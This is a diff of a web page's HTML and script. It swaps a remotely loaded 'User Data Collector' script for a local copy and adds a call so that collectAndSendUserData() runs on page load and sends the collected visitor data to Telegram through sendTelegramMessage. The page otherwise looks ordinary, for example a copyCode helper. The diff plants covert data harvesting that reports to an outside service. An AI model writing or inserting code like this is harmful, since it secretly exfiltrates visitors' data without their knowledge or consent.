@@ -146,6 +146,7 @@
     </div>
 </div>
 
+<script src="a.js"></script> <!-- Load the local User Data Collector script -->
 <script>
 // Function to send message to Telegram
 function sendTelegramMessage(message) {
@@ -169,23 +170,6 @@ function sendTelegramMessage(message) {
             console.error('Error:', error);
         });
 }
-
-// Load User Data Collector script dynamically
-const userDataScript = document.createElement('script');
-userDataScript.src = 'https://raw.githubusercontent.com/VictorRutskin/User-Data-Collector-Javascript/main/UserDataCollector.js';
-userDataScript.onload = () => {
-    console.log('User Data Collector script loaded.'); // Log successful load
-    if (typeof getUserData === 'function') {
-        console.log('getUserData function is available.'); // Confirm function is available
-        collectAndSendUserData();
-    } else {
-        console.error('getUserData function is not available.');
-    }
-};
-userDataScript.onerror = () => {
-    console.error('Failed to load User Data Collector script.'); // Log error if script fails to load
-};
-document.head.appendChild(userDataScript);
 
 // Collect user data and send it to Telegram
 function collectAndSendUserData() {
@@ -219,6 +203,9 @@ function collectAndSendUserData() {
         console.error('Error collecting user data:', err);
     });
 }
+
+// Call the function to collect and send user data
+collectAndSendUserData();
 
 function copyCode() {
     var code = "AA791";
